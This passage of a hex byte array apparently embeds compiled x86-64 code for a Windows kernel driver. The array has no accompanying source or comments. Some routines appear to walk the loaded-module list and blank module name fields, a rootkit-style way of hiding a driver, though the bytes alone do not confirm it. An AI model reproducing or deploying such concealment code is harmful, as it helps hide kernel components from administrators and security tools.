	0x8B, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x40, 0x08, 0x48, 0x89, 0x84, 0x24,
	0xA0, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x28, 0x00, 0x00, 0x00, 0x33, 0xD2,
	0x48, 0x8B, 0x4C, 0x24, 0x30, 0xE8, 0x2A, 0x52, 0x00, 0x00, 0xE8, 0xB5,
	0xF4, 0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x84, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xA8,
	0x00, 0x00, 0x00, 0xBA, 0x4D, 0x6D, 0x44, 0x54, 0x48, 0x8B, 0x8C, 0x24,
	0xA0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xA8, 0x00, 0x00, 0x00,
	0xFF, 0x15, 0xBA, 0x73, 0x00, 0x00, 0x0F, 0xB6, 0x44, 0x24, 0x21, 0x85,
	0xC0, 0x74, 0x0A, 0xC7, 0x44, 0x24, 0x38, 0x32, 0x00, 0x00, 0x00, 0xEB,
	0x0B, 0xE8, 0x1A, 0x1A, 0x00, 0x00, 0x8B, 0x00, 0x89, 0x44, 0x24, 0x38,
	0x8B, 0x44, 0x24, 0x38, 0xFF, 0xC8, 0x89, 0x44, 0x24, 0x50, 0xE8, 0x05,
	0x1A, 0x00, 0x00, 0x8B, 0x4C, 0x24, 0x50, 0x89, 0x08, 0xC6, 0x44, 0x24,
	0x20, 0x01, 0xE9, 0x6D, 0xFE, 0xFF, 0xFF, 0x0F, 0xB6, 0x44, 0x24, 0x20,
	0x85, 0xC0, 0x0F, 0x84, 0xC5, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24,
	0x48, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x30, 0x00, 0x00,
	0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x28, 0xFF, 0xC8, 0x89, 0x44, 0x24,
	0x28, 0x83, 0x7C, 0x24, 0x28, 0x00, 0x7C, 0x79, 0x0F, 0xAE, 0xE8, 0xE8,
	0x2C, 0x1A, 0x00, 0x00, 0x48, 0x63, 0x4C, 0x24, 0x28, 0x48, 0x6B, 0xC9,
	0x28, 0x48, 0x03, 0xC1, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x4C,
	0x24, 0x40, 0xE8, 0x51, 0x1E, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x02, 0xEB,
	0xC6, 0x48, 0x83, 0x7C, 0x24, 0x48, 0x00, 0x74, 0x35, 0x48, 0x8B, 0x44,
	0x24, 0x40, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0x48, 0x39, 0x48, 0x20, 0x76,
	0x25, 0xBA, 0x52, 0x80, 0x37, 0x65, 0xB9, 0x70, 0x1C, 0x17, 0x5D, 0xE8,
	0x24, 0x27, 0x00, 0x00, 0x8B, 0xC0, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0x48,
	0x2B, 0xC8, 0x48, 0x8B, 0xC1, 0x48, 0x8B, 0x4C, 0x24, 0x40, 0x48, 0x89,
	0x41, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x40, 0x48, 0x8B, 0x40, 0x20, 0x48,
	0x89, 0x44, 0x24, 0x48, 0xE9, 0x76, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 0x84,
	0x24, 0xC0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xF8, 0x48, 0x8B, 0xB4, 0x24,
	0xF0, 0x00, 0x00, 0x00, 0xB9, 0x10, 0x00, 0x00, 0x00, 0xF3, 0xA4, 0x48,
	0x8D, 0x8C, 0x24, 0xC0, 0x00, 0x00, 0x00, 0xE8, 0x34, 0xFD, 0xFF, 0xFF,
	0x90, 0xE8, 0xEE, 0xEE, 0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24, 0xB0, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x89,
	0x84, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x58, 0x48,
	0x8B, 0x84, 0x24, 0xB8, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x7B, 0x72, 0x00,
	0x00, 0x90, 0x0F, 0xB6, 0x44, 0x24, 0x20, 0x85, 0xC0, 0x75, 0x09, 0xB8,
	0x01, 0x00, 0x00, 0x00, 0xEB, 0x08, 0xEB, 0x04, 0x33, 0xC0, 0xEB, 0x02,
	0x33, 0xC0, 0x48, 0x81, 0xC4, 0xD8, 0x00, 0x00, 0x00, 0x5F, 0x5E, 0xC3,
	0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x83,
	0xEC, 0x58, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x40, 0x28, 0x48,
	0x89, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x89, 0x44,
	0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x4C, 0x24, 0x30,
	0x48, 0x39, 0x08, 0x0F, 0x84, 0x9C, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44,
	0x24, 0x20, 0x83, 0x78, 0x38, 0x00, 0x75, 0x0B, 0x48, 0xC7, 0x44, 0x24,
	0x28, 0x01, 0x00, 0x00, 0x00, 0xEB, 0x09, 0x48, 0xC7, 0x44, 0x24, 0x28,
	0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xD9, 0x71, 0x00, 0x00, 0x48,
	0x8B, 0x00, 0x48, 0x39, 0x44, 0x24, 0x28, 0x76, 0x0F, 0x48, 0x8B, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0xEB, 0xAE,
	0xE8, 0x63, 0xED, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x8B,
	0x44, 0x24, 0x20, 0x48, 0x8B, 0x40, 0x60, 0x48, 0x89, 0x44, 0x24, 0x40,
	0x48, 0x8B, 0x44, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8B,
	0x54, 0x24, 0x68, 0x48, 0x8B, 0x4C, 0x24, 0x40, 0x48, 0x8B, 0x44, 0x24,
	0x48, 0xFF, 0x15, 0xA9, 0x71, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x0F,
	0x33, 0xC0, 0x48, 0x8B, 0x4C, 0x24, 0x20, 0x66, 0x89, 0x41, 0x58, 0x33,
	0xC0, 0xEB, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x20, 0xE9, 0x51, 0xFF, 0xFF, 0xFF, 0xB8, 0x01, 0x00,
	0x00, 0xC0, 0xEB, 0x07, 0xB8, 0x01, 0x00, 0x00, 0xC0, 0xEB, 0x00, 0x48,
	0x83, 0xC4, 0x58, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x89, 0x4C, 0x24, 0x08, 0x56, 0x57, 0x48, 0x81, 0xEC, 0x48, 0x01,
	0x00, 0x00, 0x48, 0x8B, 0x05, 0x5B, 0x81, 0x00, 0x00, 0x48, 0x33, 0xC4,
	0x48, 0x89, 0x84, 0x24, 0x30, 0x01, 0x00, 0x00, 0xE8, 0x6B, 0xEF, 0xFF,
	0xFF, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8B, 0x44, 0x24, 0x48, 0x48,
	0x89, 0x44, 0x24, 0x50, 0x33, 0xC9, 0x48, 0x8B, 0x44, 0x24, 0x50, 0xFF,
	0x15, 0x27, 0x71, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x58, 0x8B, 0x44,
	0x24, 0x58, 0x89, 0x44, 0x24, 0x20, 0xE8, 0x2D, 0xED, 0xFF, 0xFF, 0x48,
	0x89, 0x44, 0x24, 0x60, 0x48, 0x8B, 0x44, 0x24, 0x60, 0x48, 0x89, 0x44,
	0x24, 0x68, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x68,
	0xFF, 0x15, 0xF6, 0x70, 0x00, 0x00, 0x89, 0x44, 0x24, 0x24, 0x33, 0xD2,
	0x8B, 0x44, 0x24, 0x24, 0xB9, 0x01, 0x09, 0x3D, 0x00, 0xF7, 0xF1, 0x8B,
	0xC2, 0x05, 0x00, 0x1B, 0xB7, 0x00, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8D,
	0x54, 0x24, 0x40, 0x48, 0x8D, 0x4C, 0x24, 0x38, 0xE8, 0x53, 0x1E, 0x00,
	0x00, 0x0F, 0xB6, 0xC0, 0x85, 0xC0, 0x75, 0x0A, 0xB8, 0x01, 0x00, 0x00,
	0x00, 0xE9, 0xD7, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x84, 0x24, 0xF8, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0xF8, 0x33, 0xC0, 0xB9, 0x38, 0x00, 0x00, 0x00,
	0xF3, 0xAA, 0x48, 0x8D, 0x84, 0x24, 0x08, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0xF8, 0x48, 0x8B, 0xB4, 0x24, 0x60, 0x01, 0x00, 0x00, 0xB9, 0x10, 0x00,
	0x00, 0x00, 0xF3, 0xA4, 0x8B, 0x44, 0x24, 0x28, 0x89, 0x84, 0x24, 0x18,
	0x01, 0x00, 0x00, 0xE8, 0xD4, 0xEE, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24,
	0x70, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x78, 0x48,
	0x8B, 0x44, 0x24, 0x70, 0x48, 0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00,
	0xB2, 0x01, 0x48, 0x8B, 0x4C, 0x24, 0x78, 0x48, 0x8B, 0x84, 0x24, 0x80,
	0x00, 0x00, 0x00, 0xFF, 0x15, 0x4B, 0x70, 0x00, 0x00, 0xE8, 0x0E, 0xEB,
	0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B,
	0x44, 0x24, 0x40, 0x48, 0x89, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x98,
	0x00, 0x00, 0x00, 0x48, 0x8D, 0x94, 0x24, 0xF8, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x8C, 0x24, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0x98,
	0x00, 0x00, 0x00, 0xFF, 0x15, 0x03, 0x70, 0x00, 0x00, 0x48, 0x89, 0x44,
	0x24, 0x30, 0x48, 0x83, 0x7C, 0x24, 0x30, 0x00, 0x75, 0x4A, 0xE8, 0x39,
	0xEC, 0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x44, 0x24, 0x38, 0x48, 0x89, 0x84, 0x24, 0xA8, 0x00, 0x00, 0x00,
	0x48, 0x8B, 0x84, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24,
	0xB0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8C, 0x24, 0xA8, 0x00, 0x00, 0x00,
	0x48, 0x8B, 0x84, 0x24, 0xB0, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xB6, 0x6F,
	0x00, 0x00, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xE9, 0xC9, 0x00, 0x00, 0x00,
	0xE8, 0xCF, 0xEA, 0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24, 0xB8, 0x00, 0x00,
	0x00, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x8C, 0x24, 0xB8, 0x00,
	0x00, 0x00, 0x48, 0x89, 0x8C, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x48, 0x8B,
	0xC8, 0x48, 0x8B, 0x84, 0x24, 0xC0, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x79,
	0x6F, 0x00, 0x00, 0x90, 0xE8, 0xAB, 0xEF, 0xFF, 0xFF, 0x48, 0x89, 0x84,
	0x24, 0xC8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x40, 0x48, 0x89,
	0x84, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xC8, 0x00,
	0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0xD8, 0x00, 0x00, 0x00, 0x48, 0x8B,
	0x54, 0x24, 0x30, 0x48, 0x8B, 0x8C, 0x24, 0xD0, 0x00, 0x00, 0x00, 0x48,
	0x8B, 0x84, 0x24, 0xD8, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x33, 0x6F, 0x00,
	0x00, 0x0F, 0xB6, 0xC0, 0x85, 0xC0, 0x75, 0x07, 0xB8, 0x01, 0x00, 0x00,
	0x00, 0xEB, 0x42, 0xE8, 0x68, 0xEB, 0xFF, 0xFF, 0x48, 0x89, 0x84, 0x24,
	0xE0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x48, 0x89, 0x84,
	0x24, 0xE8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xE0, 0x00, 0x00,
	0x00, 0x48, 0x89, 0x84, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8C,
	0x24, 0xE8, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84, 0x24, 0xF0, 0x00, 0x00,
	0x00, 0xFF, 0x15, 0xE5, 0x6E, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x8B, 0x8C,
	0x24, 0x30, 0x01, 0x00, 0x00, 0x48, 0x33, 0xCC, 0xE8, 0xCB, 0x48, 0x00,
	0x00, 0x48, 0x81, 0xC4, 0x48, 0x01, 0x00, 0x00, 0x5F, 0x5E, 0xC3, 0xCC,
	0x44, 0x88, 0x4C, 0x24, 0x20, 0x4C, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89,
	0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x83, 0xEC, 0x48,
	0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24,
	0x50, 0x48, 0x8B, 0x40, 0x28, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8B,
	0x44, 0x24, 0x28, 0x48, 0x8B, 0x40, 0x08, 0x48, 0x89, 0x44, 0x24, 0x30,
	0x0F, 0xB6, 0x44, 0x24, 0x68, 0x85, 0xC0, 0x75, 0x56, 0x48, 0x8B, 0x44,
	0x24, 0x30, 0x48, 0x8B, 0x40, 0x30, 0x48, 0x39, 0x44, 0x24, 0x60, 0x72,
	0x44, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x8B, 0x40, 0x40, 0x48, 0x8B, 0x4C,
	0x24, 0x30, 0x48, 0x03, 0x41, 0x30, 0x48, 0x39, 0x44, 0x24, 0x60, 0x73,
	0x2C, 0x33, 0xC0, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x66, 0x89, 0x41, 0x58,
	0x33, 0xC0, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x66, 0x89, 0x41, 0x5A, 0x33,
	0xC0, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x66, 0x89, 0x41, 0x48, 0x33, 0xC0,
	0x48, 0x8B, 0x4C, 0x24, 0x30, 0x66, 0x89, 0x41, 0x4A, 0xEB, 0x4B, 0x48,
	0x8B, 0x54, 0x24, 0x58, 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x8B, 0x48,
	0x60, 0xE8, 0xEE, 0x45, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x33, 0x33,
	0xC0, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x66, 0x89, 0x41, 0x48, 0x33, 0xC0,
	0x48, 0x8B, 0x4C, 0x24, 0x30, 0x66, 0x89, 0x41, 0x4A, 0x33, 0xC0, 0x48,
	0x8B, 0x4C, 0x24, 0x30, 0x66, 0x89, 0x41, 0x58, 0x33, 0xC0, 0x48, 0x8B,
	0x4C, 0x24, 0x30, 0x66, 0x89, 0x41, 0x5A, 0xB0, 0x01, 0xE9, 0xEF, 0x00,
	0x00, 0x00, 0xEB, 0x00, 0x8B, 0x44, 0x24, 0x20, 0xFF, 0xC0, 0x89, 0x44,
	0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x50, 0x48, 0x8B, 0x40, 0x28, 0x48,
	0x89, 0x44, 0x24, 0x28, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x48, 0x89, 0x44,
	0x24, 0x30, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x48, 0x8B, 0x4C, 0x24, 0x30,
	0x48, 0x39, 0x08, 0x0F, 0x84, 0xB6, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44,
	0x24, 0x28, 0x48, 0x8B, 0x0D, 0x7F, 0x6D, 0x00, 0x00, 0x48, 0x8B, 0x09,
	0x48, 0x39, 0x48, 0x38, 0x0F, 0x86, 0x8B, 0x00, 0x00, 0x00, 0x0F, 0xB6,
	0x44, 0x24, 0x68, 0x85, 0xC0, 0x75, 0x44, 0x48, 0x8B, 0x44, 0x24, 0x28,
	0x48, 0x8B, 0x40, 0x30, 0x48, 0x39, 0x44, 0x24, 0x60, 0x72, 0x32, 0x48,
	0x8B, 0x44, 0x24, 0x28, 0x8B, 0x40, 0x40, 0x48, 0x8B, 0x4C, 0x24, 0x28,
	0x48, 0x03, 0x41, 0x30, 0x48, 0x39, 0x44, 0x24, 0x60, 0x73, 0x1A, 0x33,
	0xC0, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x66, 0x89, 0x41, 0x58, 0x33, 0xC0,
	0x48, 0x8B, 0x4C, 0x24, 0x28, 0x66, 0x89, 0x41, 0x5A, 0xB0, 0x01, 0xEB,
	0x54, 0xEB, 0x32, 0x48, 0x8B, 0x54, 0x24, 0x58, 0x48, 0x8B, 0x44, 0x24,
	0x28, 0x48, 0x8B, 0x48, 0x60, 0xE8, 0x06, 0x45, 0x00, 0x00, 0x48, 0x85,
	0xC0, 0x74, 0x1A, 0x33, 0xC0, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x66, 0x89,
	0x41, 0x58, 0x33, 0xC0, 0x48, 0x8B, 0x4C, 0x24, 0x28, 0x66, 0x89, 0x41,
	0x5A, 0xB0, 0x01, 0xEB, 0x20, 0xEB, 0x00, 0x8B, 0x44, 0x24, 0x20, 0xFF,
	0xC0, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8B, 0x44, 0x24, 0x28, 0x48, 0x8B,
	0x00, 0x48, 0x89, 0x44, 0x24, 0x28, 0xE9, 0x37, 0xFF, 0xFF, 0xFF, 0x32,
	0xC0, 0x48, 0x83, 0xC4, 0x48, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x83,
	0xEC, 0x38, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xE8, 0x68, 0x42, 0x00, 0x00,
	0x48, 0x89, 0x44, 0x24, 0x20, 0x33, 0xD2, 0x48, 0x8B, 0x4C, 0x24, 0x48,
	0xFF, 0x15, 0x66, 0x6C, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x48, 0x8B,
	0x40, 0x30, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x54, 0x24, 0x10, 0x48, 0x89, 0x4C,
	0x24, 0x08, 0x56, 0x57, 0x48, 0x81, 0xEC, 0x08, 0x01, 0x00, 0x00, 0xE8,
	0xA8, 0x19, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x44, 0x00, 0x00, 0x00, 0x00,
	0x48, 0xC7, 0x44, 0x24, 0x50, 0x00, 0x00, 0x00, 0x00, 0xE8, 0xA2, 0x18,
	0x00, 0x00, 0x88, 0x44, 0x24, 0x58, 0xE8, 0xD9, 0x17, 0x00, 0x00, 0x88,
	0x44, 0x24, 0x40, 0x48, 0x8D, 0x15, 0x4E, 0x4F, 0x00, 0x00, 0x48, 0x8D,
	0x0D, 0x1F, 0x7D, 0x00, 0x00, 0xE8, 0x42, 0x22, 0x00, 0x00, 0x48, 0x8D,
	0x15, 0x6B, 0x4F, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x1C, 0x7D, 0x00, 0x00,
	0xE8, 0x2F, 0x22, 0x00, 0x00, 0xE8, 0x0A, 0xEA, 0xFF, 0xFF, 0x48, 0x89,
	0x44, 0x24, 0x70, 0x48, 0x8B, 0x44, 0x24, 0x70, 0x48, 0x89, 0x44, 0x24,
	0x78, 0x48, 0x8D, 0x44, 0x24, 0x50, 0x48, 0x89, 0x44, 0x24, 0x30, 0xC6,
	0x44, 0x24, 0x28, 0x00, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x01, 0x00, 0x00,
	0x41, 0xB9, 0x12, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xCF, 0x7C, 0x00,
	0x00, 0x33, 0xD2, 0x48, 0x8B, 0x8C, 0x24, 0x20, 0x01, 0x00, 0x00, 0x48,
	0x8B, 0x44, 0x24, 0x78, 0xFF, 0x15, 0xFA, 0x6B, 0x00, 0x00, 0x89, 0x44,
	0x24, 0x44, 0x83, 0x7C, 0x24, 0x44, 0x00, 0x7D, 0x0C, 0x0F, 0xAE, 0xE8,
	0x8B, 0x44, 0x24, 0x44, 0xE9, 0x62, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x15,
	0x9C, 0x7C, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xA5, 0x7C, 0x00, 0x00, 0xFF,
	0x15, 0x7F, 0x6B, 0x00, 0x00, 0x89, 0x44, 0x24, 0x44, 0x83, 0x7C, 0x24,
	0x44, 0x00, 0x7D, 0x4C, 0x0F, 0xAE, 0xE8, 0xE8, 0x04, 0xEB, 0xFF, 0xFF,
	0x48, 0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24,
	0x50, 0x48, 0x89, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84,
	0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x90, 0x00, 0x00,
	0x00, 0x48, 0x8B, 0x8C, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x84,
	0x24, 0x90, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x81, 0x6B, 0x00, 0x00, 0x8B,
	0x44, 0x24, 0x44, 0xE9, 0xF7, 0x01, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x48,
	0x00, 0x00, 0x00, 0x00, 0xEB, 0x0A, 0x8B, 0x44, 0x24, 0x48, 0xFF, 0xC0,
	0x89, 0x44, 0x24, 0x48, 0x83, 0x7C, 0x24, 0x48, 0x1B, 0x7F, 0x1B, 0x48,
	0x63, 0x44, 0x24, 0x48, 0x48, 0x8B, 0x8C, 0x24, 0x20, 0x01, 0x00, 0x00,
	0x48, 0x8D, 0x15, 0x41, 0x25, 0x00, 0x00, 0x48, 0x89, 0x54, 0xC1, 0x70,
	0xEB, 0xD4, 0x48, 0x8B, 0x44, 0x24, 0x50, 0x8B, 0x40, 0x30, 0x83, 0xC8,
	0x04, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0x89, 0x41, 0x30, 0x0F, 0xB6, 0x44,
	0x24, 0x40, 0x85, 0xC0, 0x74, 0x14, 0x48, 0x8B, 0x44, 0x24, 0x50, 0x8B,
	0x40, 0x30, 0x0F, 0xBA, 0xE8, 0x0D, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0x89,
	0x41, 0x30, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48,
	0x8B, 0x8C, 0x24, 0x20, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x12, 0xFE,
	0xFF, 0xFF, 0x48, 0x89, 0x54, 0x01, 0x70, 0xB8, 0x08, 0x00, 0x00, 0x00,
	0x48, 0x6B, 0xC0, 0x02, 0x48, 0x8B, 0x8C, 0x24, 0x20, 0x01, 0x00, 0x00,
	0x48, 0x8D, 0x15, 0xF5, 0xFD, 0xFF, 0xFF, 0x48, 0x89, 0x54, 0x01, 0x70,
	0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x0E, 0x48, 0x8B, 0x8C,
	0x24, 0x20, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xD8, 0x39, 0x00, 0x00,
	0x48, 0x89, 0x54, 0x01, 0x70, 0x48, 0x8B, 0x84, 0x24, 0x20, 0x01, 0x00,
	0x00, 0x48, 0x8D, 0x0D, 0x24, 0x24, 0x00, 0x00, 0x48, 0x89, 0x48, 0x68,
	0x48, 0x8B, 0x44, 0x24, 0x50, 0x8B, 0x40, 0x30, 0x0F, 0xBA, 0xF0, 0x07,
	0x48, 0x8B, 0x4C, 0x24, 0x50, 0x89, 0x41, 0x30, 0x48, 0x8D, 0x15, 0xE5,
	0x4D, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x60, 0xE8, 0x6B, 0x20, 0x00,
	0x00, 0xB8, 0x10, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x98, 0x00,
	0x00, 0x00, 0xB8, 0x12, 0x00, 0x00, 0x00, 0x66, 0x89, 0x84, 0x24, 0x9A,
	0x00, 0x00, 0x00, 0x48, 0x8D, 0x05, 0xDA, 0x4D, 0x00, 0x00, 0x48, 0x89,
	0x84, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x0F, 0xB6, 0x44, 0x24, 0x40, 0x85,
	0xC0, 0x0F, 0x85, 0xA2, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x84, 0x24, 0xB0,
	0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x60, 0x48, 0x8B, 0xF8, 0x48,
	0x8B, 0xF1, 0xB9, 0x10, 0x00, 0x00, 0x00, 0xF3, 0xA4, 0x48, 0x8D, 0x8C,
	0x24, 0xB0, 0x00, 0x00, 0x00, 0xE8, 0xBE, 0xF8, 0xFF, 0xFF, 0x48, 0x8D,
	0x84, 0x24, 0xC0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0x98, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0xF8, 0x48, 0x8B, 0xF1, 0xB9, 0x10, 0x00, 0x00,
	0x00, 0xF3, 0xA4, 0x48, 0x8D, 0x8C, 0x24, 0xC0, 0x00, 0x00, 0x00, 0xE8,
	0xF4, 0xF0, 0xFF, 0xFF, 0x48, 0x8D, 0x84, 0x24, 0xD0, 0x00, 0x00, 0x00,
	0x48, 0x8D, 0x4C, 0x24, 0x60, 0x48, 0x8B, 0xF8, 0x48, 0x8B, 0xF1, 0xB9,
	0x10, 0x00, 0x00, 0x00, 0xF3, 0xA4, 0x48, 0x8D, 0x8C, 0x24, 0xD0, 0x00,
	0x00, 0x00, 0xE8, 0xCD, 0xF0, 0xFF, 0xFF, 0x48, 0x8D, 0x84, 0x24, 0xE0,
	0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x60, 0x48, 0x8B, 0xF8, 0x48,
	0x8B, 0xF1, 0xB9, 0x10, 0x00, 0x00, 0x00, 0xF3, 0xA4, 0x48, 0x8D, 0x8C,
	0x24, 0xE0, 0x00, 0x00, 0x00, 0xE8, 0x36, 0xF4, 0xFF, 0xFF, 0x90, 0xEB,
	0x28, 0x48, 0x8D, 0x84, 0x24, 0xF0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4C,
	0x24, 0x60, 0x48, 0x8B, 0xF8, 0x48, 0x8B, 0xF1, 0xB9, 0x10, 0x00, 0x00,
	0x00, 0xF3, 0xA4, 0x48, 0x8D, 0x8C, 0x24, 0xF0, 0x00, 0x00, 0x00, 0xE8,
	0x1C, 0xF8, 0xFF, 0xFF, 0x90, 0x33, 0xC0, 0x48, 0x81, 0xC4, 0x08, 0x01,
	0x00, 0x00, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28,
	0x48, 0x8D, 0x15, 0xB5, 0xFC, 0xFF, 0xFF, 0x33, 0xC9, 0xE8, 0x60, 0x41,
	0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x81, 0xEC, 0xD8, 0x00, 0x00, 0x00, 0x48,
